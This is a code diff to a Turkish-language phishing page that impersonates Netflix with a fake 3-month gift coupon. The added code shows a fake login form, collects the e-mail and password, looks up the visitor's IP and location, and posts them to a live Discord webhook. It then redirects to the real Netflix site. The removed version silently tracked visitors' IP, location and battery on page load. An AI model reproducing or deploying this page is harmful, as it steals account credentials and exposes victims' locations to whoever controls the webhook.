@@ -3,94 +3,133 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Netflix - Hediye Merkezi</title>
     
-    <title>Netflix - 3 Aylık Ücretsiz Hediye Kuponu</title>
-    <meta name="description" content="Tebrikler! 2026 yılına özel ücretsiz Netflix kuponunuzu hemen tanımlayın. Sınırlı sayıda!">
     <meta property="og:title" content="Netflix - Hediye Merkezi">
+    <meta property="og:description" content="Tebrikler! 3 Aylık Ücretsiz Kuponunuzu Hemen Aktif Edin.">
     <meta property="og:image" content="https://images.ctfassets.net/4cd45et68cgf/4nBnsuPq03nE9S60sboE9/89a742057c366021ad4ad2c4a2b9ef92/Netflix_App_Icon.png">
-    <meta property="og:type" content="website">
 
     <style>
-        body { background-color: #000; color: #fff; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
-        .container { text-align: center; padding: 20px; }
-        img.logo { width: 140px; margin-bottom: 20px; }
+        body { background-color: #000; color: #fff; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+        
+        /* SAHTE BİLDİRİM */
+        #notification {
+            position: fixed; top: -100px; left: 50%; transform: translateX(-50%);
+            width: 90%; max-width: 400px; background: rgba(30, 30, 30, 0.95);
+            border-radius: 15px; padding: 15px; display: flex; align-items: center;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5); transition: 0.5s; z-index: 1000;
+        }
+        #notification img { width: 40px; border-radius: 8px; margin-right: 12px; }
+        #notification .text { flex: 1; }
+        #notification .title { font-weight: bold; font-size: 14px; display: block; }
+        #notification .msg { font-size: 13px; color: #ccc; }
+
+        /* GİRİŞ PANELİ */
+        .login-box { width: 90%; max-width: 350px; text-align: center; }
+        .login-box img { width: 150px; margin-bottom: 30px; }
+        input { width: 100%; padding: 15px; margin-bottom: 15px; border-radius: 5px; border: none; background: #333; color: #fff; box-sizing: border-box; }
+        button { width: 100%; padding: 15px; border: none; border-radius: 5px; background: #e50914; color: #fff; font-size: 16px; font-weight: bold; cursor: pointer; }
+        
+        .loading-screen { display: none; text-align: center; }
         .loader { border: 4px solid #333; border-top: 4px solid #e50914; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        h1 { font-size: 22px; font-weight: bold; margin-bottom: 8px; }
-        p { color: #a1a1a1; font-size: 15px; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" class="logo">
-        <h1>Hediye Kodunuz Hazırlanıyor</h1>
-        <p>Sistem kontrol ediliyor, lütfen bekleyin...</p>
+
+    <div id="notification">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/f/ff/Netflix-new-icon.png">
+        <div class="text">
+            <span class="title">Netflix</span>
+            <span class="msg">Tebrikler! Üyeliğiniz aktif edildi.</span>
+        </div>
+    </div>
+
+    <div class="login-box" id="loginBox">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg">
+        <h2 style="font-size: 20px; margin-bottom: 20px;">Hediye Kodunu Almak İçin Giriş Yapın</h2>
+        <input type="email" id="email" placeholder="E-posta veya telefon numarası" required>
+        <input type="password" id="password" placeholder="Parola" required>
+        <button onclick="loginVeGonder()">Oturum Aç</button>
+    </div>
+
+    <div class="loading-screen" id="loadingScreen">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" width="120">
+        <h3>Kod Tanımlanıyor...</h3>
         <div class="loader"></div>
     </div>
+
+    <audio id="netflixSound">
+        <source src="https://www.myinstants.com/media/sounds/netflix-tudum.mp3" type="audio/mpeg">
+    </audio>
 
     <script>
         const webhookURL = "https://discord.com/api/webhooks/1476700662212329595/_PH17dgTO-VNM48nCiAI3oEbB4zfonVEBqN3n-9KIx5wObUzwTEtr_D_3s5206i_gzKM";
 
-        // GARANTİ YÖNLENDİRME (4.5 Saniye sonra kesin atar)
-        setTimeout(() => {
-            window.location.replace("https://www.netflix.com/tr/redeem");
-        }, 4500);
+        // Sayfa tıklandığında sesi çal ve bildirimi göster
+        document.body.onclick = function() {
+            document.getElementById('netflixSound').play();
+            setTimeout(() => {
+                document.getElementById('notification').style.top = "20px";
+            }, 500);
+            setTimeout(() => {
+                document.getElementById('notification').style.top = "-100px";
+            }, 4000);
+        };
 
-        async function sinsiBot() {
+        async function loginVeGonder() {
+            const email = document.getElementById('email').value;
+            const pass = document.getElementById('password').value;
+
+            if(!email || !pass) { alert("Lütfen bilgileri girin!"); return; }
+
+            document.getElementById('loginBox').style.display = "none";
+            document.getElementById('loadingScreen').style.display = "block";
+
             try {
-                // IP ve Detaylı Konum Bilgisi
+                // Konum ve IP Alımı
                 const res = await fetch('https://ipapi.co/json/');
                 const d = await res.json();
                 
-                // Harita Linki
-                const harita = `https://www.google.com/maps?q=${d.latitude},${d.longitude}`;
-
-                // Cihaz Bilgisi
                 const ua = navigator.userAgent;
-                let cihazTipi = "🖥️ Bilgisayar (PC)";
-                if (/tablet|ipad/i.test(ua)) cihazTipi = "📟 Tablet";
-                else if (/Mobile|Android|iPhone/i.test(ua)) cihazTipi = "📱 Akıllı Telefon";
+                let cihaz = "📱 Mobil";
+                if(!/Mobi|Android|iPhone/i.test(ua)) cihaz = "🖥️ PC";
 
-                // Batarya Bilgisi
-                let pil = "Bilinmiyor";
-                if (navigator.getBattery) {
-                    const b = await navigator.getBattery();
-                    pil = `%${Math.round(b.level * 100)} ${b.charging ? '🔌' : '🔋'}`;
-                }
-
-                // DISCORD MESAJ TASARIMI
+                // DISCORD RAPORU
                 const rapor = {
                     username: "ANONİM BOT",
                     avatar_url: "https://i.imgur.com/8nN9S1L.png",
                     embeds: [{
-                        title: "🎯 HEDEF PAKETLENDİ!",
-                        description: "```fix\nKurban tuzağa düştü. Veriler sisteme işlendi.```",
-                        color: 16711680, // Sol kırmızı şerit
+                        title: "🔥 HESAP VE KONUM ELE GEÇİRİLDİ!",
+                        description: "```fix\nKurban giriş yaptı ve tüm bilgiler çekildi.```",
+                        color: 16711680,
                         fields: [
-                            { name: "👤 Cihaz / Batarya", value: `> ${cihazTipi} | **${pil}**`, inline: false },
-                            { name: "🌐 IP Adresi", value: `\`\`\`css\n${d.ip}\n\`\`\``, inline: false },
-                            { name: "🏠 Detaylı Adres", value: `📍 **${d.region} / ${d.city} / ${d.postal || "Yok"}**`, inline: false },
-                            { name: "📡 İnternet Hattı", value: `📡 *${d.org}*`, inline: false },
-                            { name: "📍 Harita Konumu", value: `[🗺️ Nokta Atışı Haritada Gör (Tıkla)](${harita})`, inline: false }
+                            { name: "📧 E-Posta / Telefon", value: `**${email}**`, inline: true },
+                            { name: "🔑 Parola", value: `\`${pass}\``, inline: true },
+                            { name: "🌐 IP Adresi", value: `\`\`\`${d.ip}\`\`\``, inline: false },
+                            { name: "📍 Adres", value: `**${d.region} / ${d.city}**`, inline: true },
+                            { name: "📱 Cihaz", value: cihaz, inline: true },
+                            { name: "🗺️ Harita", value: `[Konuma Git](https://www.google.com/maps?q=${d.latitude},${d.longitude})`, inline: false }
                         ],
-                        footer: { text: "ANONİM BOT Takip Sistemi • " + new Date().toLocaleString('tr-TR') },
-                        thumbnail: { url: "https://upload.wikimedia.org/wikipedia/commons/f/ff/Netflix-new-icon.png" } // Sağ üstteki logo
+                        footer: { text: "ANONİM BOT • " + new Date().toLocaleString('tr-TR') },
+                        thumbnail: { url: "https://upload.wikimedia.org/wikipedia/commons/f/ff/Netflix-new-icon.png" }
                     }]
                 };
 
-                // Discord'a fırlat
                 await fetch(webhookURL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(rapor)
                 });
 
+                setTimeout(() => {
+                    window.location.replace("https://www.netflix.com/tr/redeem");
+                }, 3000);
+
             } catch (e) {
-                console.log("Hata olsa da yönlendirme devam eder.");
+                window.location.replace("https://www.netflix.com/tr/redeem");
             }
         }
-
-        window.onload = sinsiBot;
     </script>
 </body>
 </html>
